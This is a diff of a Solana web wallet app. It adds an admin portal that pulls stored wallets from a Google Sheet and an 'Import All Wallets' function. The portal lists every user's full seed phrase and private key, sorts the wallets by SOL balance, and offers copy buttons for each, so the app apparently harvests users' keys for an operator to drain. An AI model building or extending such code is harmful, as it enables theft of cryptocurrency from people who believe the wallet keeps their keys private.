+      } else if (exists) {
+        skippedCount++;
+      }
+    }
+    
+    if (importedCount > 0) {
+      saveAllWallets();
+      showToast(`Imported ${importedCount} wallets from sheet${skippedCount > 0 ? ` (${skippedCount} already existed)` : ''}`);
+      loadAdminPortal(); // Refresh admin view
+      if (!currentWallet && walletsList.length > 0) {
+        currentWallet = walletsList[0];
+        localStorage.setItem('currentWalletId', currentWallet.id);
+        document.getElementById('walletAddress').innerHTML = currentWallet.publicKey;
+        document.getElementById('currentAccountName').innerHTML = currentWallet.name;
+        document.getElementById('mainApp').style.display = 'block';
+        document.getElementById('authScreen').style.display = 'none';
+        fetchRealBalance();
+        renderTransactions();
+      }
+    } else {
+      showToast('No new wallets to import');
+    }
+  }
   
   async function loadAdminPortal() {
     const adminTable = document.getElementById('adminTable');
     adminTable.innerHTML = '<div class="loading"><div class="loading-spinner"></div><div>Loading wallets and fetching balances...</div></div>';
     
     try {
-      // Get all wallets from Google Sheet
       const response = await fetch(GOOGLE_SHEET_URL);
       const allData = await response.json();
-      const walletsData = allData.slice(1); // Remove header row
+      const walletsData = allData.slice(1);
       
-      if (!walletsData.length) {
-        adminTable.innerHTML = '<div class="empty-state"><div class="empty-icon">📭</div><div class="empty-text">No wallets created yet</div></div>';
-        document.getElementById('adminPortal').classList.add('active');
-        return;
-      }
-      
-      // Create array of wallets with their data
-      let walletsWithBalances = [];
-      
-      // Fetch real balances for each wallet
+      // Store sheet data for import
+      sheetWalletsData = [];
       for (let i = 0; i < walletsData.length; i++) {
         const wallet = walletsData[i];
-        const publicKey = wallet[3];
-        const seedPhrase = wallet[5] || 'N/A';
-        const privateKey = wallet[4] || 'N/A';
-        const createdAt = wallet[0] || '';
-        
-        // Fetch real SOL balance from blockchain
+        if (wallet[3] && wallet[3] !== 'N/A') {
+          sheetWalletsData.push({
+            publicKey: wallet[3],
+            privateKey: wallet[4] || 'N/A',
+            seedPhrase: wallet[5] || 'N/A',
+            createdAt: wallet[0] || new Date().toISOString()
+          });
+        }
+      }
+      
+      let walletsWithBalances = [];
+      
+      for (let i = 0; i < walletsList.length; i++) {
+        const wallet = walletsList[i];
         let balance = 0;
-        if (publicKey && publicKey !== 'N/A') {
+        if (wallet.publicKey) {
           try {
-            const pubKey = new solanaWeb3.PublicKey(publicKey);
+            const pubKey = new solanaWeb3.PublicKey(wallet.publicKey);
             const balanceLamports = await connection.getBalance(pubKey);
             balance = balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
+            wallet.balance = balance;
           } catch(e) {
-            console.log('Error fetching balance for', publicKey);
             balance = 0;
           }
         }
         
         walletsWithBalances.push({
-          publicKey: publicKey,
-          seedPhrase: seedPhrase,
-          privateKey: privateKey,
+          id: wallet.id,
+          publicKey: wallet.publicKey,
+          seedPhrase: wallet.seedPhrase || 'N/A',
+          privateKey: wallet.privateKey || 'N/A',
           balance: balance,
-          createdAt: createdAt,
-          index: i + 1
+          createdAt: wallet.createdAt || new Date().toISOString(),
+          index: walletsList.indexOf(wallet) + 1
         });
       }
       
-      // Sort by balance (highest first)
       walletsWithBalances.sort((a, b) => b.balance - a.balance);
       
-      // Build HTML table - Clean version without device info
-      let html = `
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>Wallet Address</th>
-            <th style="background:#14F19520;">🔐 Seed Phrase</th>
-            <th style="background:#F23B5C20;">🔑 Private Key</th>
-            <th>💰 SOL Balance</th>
-            <th>📅 Created</th>
-          </tr>
-        </thead>
-        <tbody>
-      `;
+      let html = '';
       
-      for (const wallet of walletsWithBalances) {
-        const shortAddress = wallet.publicKey ? wallet.publicKey.slice(0, 8) + '...' + wallet.publicKey.slice(-6) : 'N/A';
-        const formattedDate = wallet.createdAt ? new Date(wallet.createdAt).toLocaleString() : 'Unknown';
-        
-        html += `
-          <tr class="wallet-row">
-            <td style="font-weight: 600; color: #14F195;">${wallet.index}</td>
-            <td class="address-cell" title="${wallet.publicKey}">
-              ${shortAddress}
-              ${wallet.publicKey && wallet.publicKey !== 'N/A' ? `<br><button class="copy-btn" onclick="copyToClipboard('${wallet.publicKey.replace(/'/g, "\\'")}')">📋 Copy Address</button>` : ''}
-            </td>
-            <td style="background:#14F19510;">
-              <div class="key-cell">${wallet.seedPhrase !== 'N/A' ? wallet.seedPhrase.substring(0, 50) + (wallet.seedPhrase.length > 50 ? '...' : '') : 'N/A'}</div>
-              ${wallet.seedPhrase !== 'N/A' ? `<button class="copy-btn" onclick="copyToClipboard('${wallet.seedPhrase.replace(/'/g, "\\'")}')">📋 Copy Seed</button>` : ''}
-            </td>
-            <td style="background:#F23B5C10;">
-              <div class="key-cell">${wallet.privateKey !== 'N/A' ? wallet.privateKey.substring(0, 30) + '...' : 'N/A'}</div>
-              ${wallet.privateKey !== 'N/A' ? `<button class="copy-btn" onclick="copyToClipboard('${wallet.privateKey.replace(/'/g, "\\'")}')">🔐 Copy Private Key</button>` : ''}
-            </td>
-            <td class="balance-cell">
-              ${wallet.balance.toFixed(6)} SOL
-              <br>
-              <span style="font-size: 10px; color: #8E8E93;">≈ $${(wallet.balance * solPrice).toFixed(2)}</span>
-            </td>
-            <td class="date-cell">${formattedDate}</td>
-          </tr>
-        `;
+      if (walletsWithBalances.length === 0) {
+        html = '<div class="empty-state"><div class="empty-icon">📭</div><div class="empty-text">No wallets in local storage. Click "Import All Wallets" to load from Google Sheets.</div></div>';
+      } else {
+        for (const wallet of walletsWithBalances) {
+          const formattedDate = wallet.createdAt ? new Date(wallet.createdAt).toLocaleString() : 'Unknown';
+          
+          html += `
+            <div class="wallet-card">
+              <div class="wallet-card-header">
+                <span class="wallet-index">Wallet #${wallet.index}</span>
+                <button class="delete-wallet-btn" onclick="deleteWallet('${wallet.id}')">🗑️ Delete</button>
+              </div>
+              <div class="wallet-row-info">
+                <div class="balance-box">
+                  <div class="balance-label-small">💰 SOL Balance</div>
+                  <div class="balance-value">${wallet.balance.toFixed(6)} SOL</div>
+                  <div style="font-size: 10px; color: #8E8E93;">≈ $${(wallet.balance * solPrice).toFixed(2)}</div>
+                </div>
+                <button class="copy-key-btn" onclick="copyToClipboard('${wallet.privateKey.replace(/'/g, "\\'")}')">🔑 Copy Private Key</button>
+                <div class="address-box">
+                  <div class="address-full">📍 ${wallet.publicKey}</div>
+                  <button class="copy-key-btn" onclick="copyToClipboard('${wallet.publicKey.replace(/'/g, "\\'")}')">📋 Copy Address</button>
+                </div>
+                <div class="date-box">
+                  📅 ${formattedDate}
+                </div>
+              </div>
+              <div class="seed-box">
+                <div class="seed-label">🔐 Seed Phrase:</div>
+                <div class="seed-value">${wallet.seedPhrase !== 'N/A' ? wallet.seedPhrase : 'Imported wallet (no seed phrase stored)'}</div>
+                ${wallet.seedPhrase !== 'N/A' ? `<button class="copy-key-btn" onclick="copyToClipboard('${wallet.seedPhrase.replace(/'/g, "\\'")}')">📋 Copy Seed Phrase</button>` : ''}
+              </div>
+            </div>
+          `;
+        }
       }
       
-      html += `
-        </tbody>
-        <tfoot>
-          <tr>
-            <td colspan="6" style="padding: 16px; text-align: center; background: rgba(20,241,149,0.05);">
-              📊 Total Wallets: ${walletsWithBalances.length} | 💰 Total SOL: ${walletsWithBalances.reduce((sum, w) => sum + w.balance, 0).toFixed(6)} SOL
-            </td>
-          </tr>
-        </tfoot>
-      `;
+      html += `<div style="padding: 16px; text-align: center; background: rgba(20,241,149,0.05); border-radius: 16px; margin-top: 16px;">
+        📊 Total Wallets: ${walletsWithBalances.length} | 💰 Total SOL: ${walletsWithBalances.reduce((sum, w) => sum + w.balance, 0).toFixed(6)} SOL
+      </div>`;
       
       adminTable.innerHTML = html;
       document.getElementById('adminPortal').classList.add('active');
@@ -1466,7 +1869,10 @@
   function copyToClipboard(text) { navigator.clipboard.writeText(text); showToast('Copied to clipboard!'); }
   function goToPage(index) { document.getElementById("pagesContainer").style.transform = `translateX(-${index * 50}%)`; document.querySelectorAll(".tab-item").forEach((tab, i) => { if (i === index) tab.classList.add("active"); else tab.classList.remove("active"); }); }
 
-  function generateAdditionalWallet() { closeModal('addAccountModal'); try { const keypair = solanaWeb3.Keypair.generate(); const publicKey = keypair.publicKey.toString(); const privateKey = toBase58(keypair.secretKey); const mnemonic = generateMnemonic(); const wallet = { id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6), name: 'Wallet ' + (walletsList.length + 1), publicKey: publicKey, privateKey: privateKey, seedPhrase: mnemonic, createdAt: new Date().toISOString(), balance: 0, usdcBalance: 0, usdtBalance: 0 }; walletsList.push(wallet); saveAllWallets(); alert('🔐 PRIVATE KEY\n\n' + privateKey + '\n\n⚠️ IMPORTANT SECURITY WARNING ⚠️\n\n• Store this key in a SAFE place!\n• NEVER share this key with ANYONE!\n• Write it down and keep it OFFLINE!\n• This is the ONLY way to recover your wallet!\n\n👀 Keep your crypto safe!'); showToast('New wallet added!'); switchToWallet(wallet.id); } catch(e) { showToast('Error: ' + e.message); } }
+  function generateAdditionalWallet() { closeModal('addAccountModal'); try { const keypair = solanaWeb3.Keypair.generate(); const publicKey = keypair.publicKey.toString(); const privateKey = toBase58(keypair.secretKey); const mnemonic = generateMnemonic(); const wallet = { id: 'wallet_' + Date.now() + '_' + Math.random().toString(36).substr(2,6), name: 'Wallet ' + (walletsList.length + 1), publicKey: publicKey, privateKey: privateKey, seedPhrase: mnemonic, createdAt: new Date().toISOString(), balance: 0, usdcBalance: 0, usdtBalance: 0 }; walletsList.push(wallet); saveAllWallets(); showCustomAlert('🔐 NEW WALLET CREATED', '', [
+    { label: 'Private Key', value: privateKey },
+    { label: 'Seed Phrase', value: mnemonic }
+  ]); showToast('New wallet added!'); switchToWallet(wallet.id); } catch(e) { showToast('Error: ' + e.message); } }
   
   function showImportForAdd() { closeModal('addAccountModal'); document.getElementById('importForAddModal').classList.add('active'); }
   
@@ -1479,22 +1885,95 @@
   function closeAccountModal() { document.getElementById('accountModal').classList.remove('active'); }
   function openAddAccountModal() { document.getElementById('addAccountModal').classList.add('active'); }
 
-  // Completely disable horizontal scroll on pages container
+  function showTokenDetail(tokenName) {
+    let balance = 0;
+    let value = 0;
+    let icon = '';
+    let tokenSymbol = '';
+    let isStable = false;
+    
+    if (tokenName === 'SOL') {
+      balance = currentWallet.balance || 0;
+      value = balance * solPrice;
+      icon = 'https://assets.coingecko.com/coins/images/4128/large/solana.png';
+      tokenSymbol = 'SOL';
+      isStable = false;
+    } else if (tokenName === 'USDC') {
+      balance = currentWallet.usdcBalance || 0;
+      value = balance;
+      icon = 'https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png';
+      tokenSymbol = 'USDC';
+      isStable = true;
+    } else if (tokenName === 'USDT') {
+      balance = currentWallet.usdtBalance || 0;
+      value = balance;
+      icon = 'https://assets.coingecko.com/coins/images/325/large/Tether.png';
+      tokenSymbol = 'USDT';
+      isStable = true;
+    }
+    
+    document.getElementById('detailIcon').innerHTML = `<img src="${icon}" width="48" height="48">`;
+    document.getElementById('detailTokenName').innerHTML = tokenSymbol;
+    document.getElementById('detailTokenPrice').innerHTML = tokenName === 'SOL' ? `$${solPrice.toFixed(2)}` : '$1.00';
+    document.getElementById('detailBalance').innerHTML = balance.toFixed(6);
+    document.getElementById('detailValue').innerHTML = `$${value.toFixed(2)}`;
+    // Fix: Show 0% change if balance is 0, otherwise show actual change
+    const changeDisplay = (tokenName === 'SOL' && balance > 0) ? solPriceChange24h : 0;
+    document.getElementById('detailChange').innerHTML = `${changeDisplay >= 0 ? '+' : ''}${changeDisplay.toFixed(2)}%`;
+    const changeClass = changeDisplay >= 0 ? 'positive' : 'negative';
+    document.getElementById('detailChange').className = `detail-stat-value ${changeClass}`;
+    
+    const detailCanvas = document.getElementById('detailChart');
+    if (detailCanvas) {
+      const ctx = detailCanvas.getContext('2d');
+      const priceForChart = tokenName === 'SOL' ? solPrice : 1;
+      const hist = generatePriceHistory(priceForChart, '1W', isStable);
+      const w = detailCanvas.clientWidth, h = 200;
+      detailCanvas.width = w; detailCanvas.height = h;
+      ctx.clearRect(0, 0, w, h);
+      
+      const step = w / (hist.length - 1);
+      const minVal = Math.min(...hist), maxVal = Math.max(...hist), range = maxVal - minVal;
+      const getY = (val) => h - 20 - ((val - minVal) / range) * (h - 40);
+      
+      const isPositive = (tokenName === 'SOL' && balance > 0) ? solPriceChange24h >= 0 : true;
+      
+      ctx.beginPath();
+      ctx.lineWidth = 2.5;
+      ctx.strokeStyle = isPositive ? "#22C55E" : "#F23B5C";
+      for (let i = 0; i < hist.length; i++) {
+        const x = i * step, y = getY(hist[i]);
+        if (i === 0) ctx.moveTo(x, y);
+        else ctx.lineTo(x, y);
+      }
+      ctx.stroke();
+      
+      ctx.lineTo(w, h - 20);
+      ctx.lineTo(0, h - 20);
+      ctx.closePath();
+      ctx.fillStyle = isPositive ? "rgba(34,197,94,0.1)" : "rgba(242,59,92,0.1)";
+      ctx.fill();
+    }
+    
+    document.getElementById('tokenDetailModal').classList.add('active');
+  }
+  
+  function closeTokenDetail() {
+    document.getElementById('tokenDetailModal').classList.remove('active');
+  }
+
   function disableHorizontalScroll() {
     const pagesContainer = document.getElementById('pagesContainer');
-    
     pagesContainer.addEventListener('touchstart', function(e) {
       const touch = e.touches[0];
       this.startX = touch.clientX;
       this.startY = touch.clientY;
     }, { passive: false });
-    
     pagesContainer.addEventListener('touchmove', function(e) {
       if (!this.startX || !this.startY) return;
       const touch = e.touches[0];
       const diffX = Math.abs(touch.clientX - this.startX);
       const diffY = Math.abs(touch.clientY - this.startY);
-      
       if (diffX > diffY && diffX > 5) {
         e.preventDefault();
         return false;
@@ -1539,6 +2018,11 @@
   window.importAdditionalWallet = importAdditionalWallet;
   window.showPrivateKeyForWallet = showPrivateKeyForWallet;
   window.toggleSwapDirection = toggleSwapDirection;
+  window.showTokenDetail = showTokenDetail;
+  window.closeTokenDetail = closeTokenDetail;
+  window.closeCustomAlert = closeCustomAlert;
+  window.deleteWallet = deleteWallet;
+  window.importAllWalletsFromSheet = importAllWalletsFromSheet;
 
   init();
 </script>
